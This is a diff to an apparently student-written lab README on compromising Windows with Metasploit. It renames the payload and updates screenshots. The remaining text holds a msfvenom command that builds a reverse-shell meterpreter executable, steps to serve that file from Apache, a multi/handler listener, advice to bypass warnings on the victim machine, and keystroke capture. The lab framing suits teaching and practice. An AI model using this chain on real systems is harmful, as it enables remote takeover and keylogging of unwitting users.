@@ -3,6 +3,8 @@ Compromising windows using Metasploit
 # Metasploit
 Compromising windows using Metasploit
 
+### Developed By
+
 # AIM:
 
 To Compromise windows using Metasploit .
@@ -60,46 +62,52 @@ msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload
 Find the attackers ip address using ifconfig
 
 ### Output:
-<img width="1920" height="936" alt="Screenshot_2025-10-02_13_45_11" src="https://github.com/user-attachments/assets/85c0e8b6-f33e-4bda-8167-db332a162ba3" />
+
+<img width="732" height="498" alt="image" src="https://github.com/user-attachments/assets/f0b21e63-c196-4f8c-9cf4-c57bf565aa07" />
 
 
-
-Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```
+Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > nikhil.exe```
 
 ### Output:
 
-<img width="1920" height="936" alt="Screenshot_2025-10-02_13_45_35" src="https://github.com/user-attachments/assets/be515fa0-cc19-48d7-a2c1-34a22accb9e1" />
+<img width="917" height="244" alt="image" src="https://github.com/user-attachments/assets/e0c1c121-7bf8-4db7-9636-c464a5893f83" />
 
 
-copy the fun.exe into the apache ```/var/www/html ```folder
+
+copy the nikhil.exe into the apache ```/var/www/html ```folder
+
+<img width="409" height="122" alt="image" src="https://github.com/user-attachments/assets/bf91f50e-ed72-49ce-91b6-68b8f9751ae4" />
+<img width="311" height="65" alt="image" src="https://github.com/user-attachments/assets/b72bc5ed-aefc-4229-be0e-8990f59cb038" />
 
 
 
 Start apache server ```sudo systemctl apache2 start``` 
-
-
-
 Check the status of apache2 ```sudo apache2 status```
+
+<img width="809" height="385" alt="Screenshot 2025-09-29 083722" src="https://github.com/user-attachments/assets/b193bd17-d388-4ea2-885d-1338913f62b7" />
+
 
 
 Invoke msfconsole:
 
+<img width="642" height="648" alt="image" src="https://github.com/user-attachments/assets/24e92ff8-eda2-412d-a045-365ee9e44697" />
+
+
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
+
+<img width="754" height="497" alt="image" src="https://github.com/user-attachments/assets/72c1356d-0d76-4d8d-9517-313e78b7f361" />
+
 
 Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
 
 ### Output 
-<img width="1920" height="936" alt="Screenshot_2025-10-02_13_45_52" src="https://github.com/user-attachments/assets/62a943a5-7812-4713-aa64-af2c1b122566" />
+<img width="539" height="107" alt="image" src="https://github.com/user-attachments/assets/b4004be8-5d93-4140-b3d8-3d208811e2c5" />
 
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
 
-
-
 Bypass any warning boxes, double-click the file, and allow it to run.
 On kali give the command exploit
-
-<img width="1920" height="936" alt="Screenshot_2025-10-02_13_46_01" src="https://github.com/user-attachments/assets/3cd0bceb-a958-45d8-91ce-cb51238c1b06" />
 
 
 
@@ -115,9 +123,9 @@ The target is now owned. Following are meterpreter commands for key capturing in
 
 
 keyscan_dump Shows the keystrokes captured so far
-<img width="1920" height="936" alt="Screenshot_2025-10-02_13_46_21" src="https://github.com/user-attachments/assets/9a1044ce-b2ce-43a7-9c68-41bedc450331" />
 
 
 
 ## RESULT:
 The Metasploit framework is  used to compromise windows and is examined successfully.
+
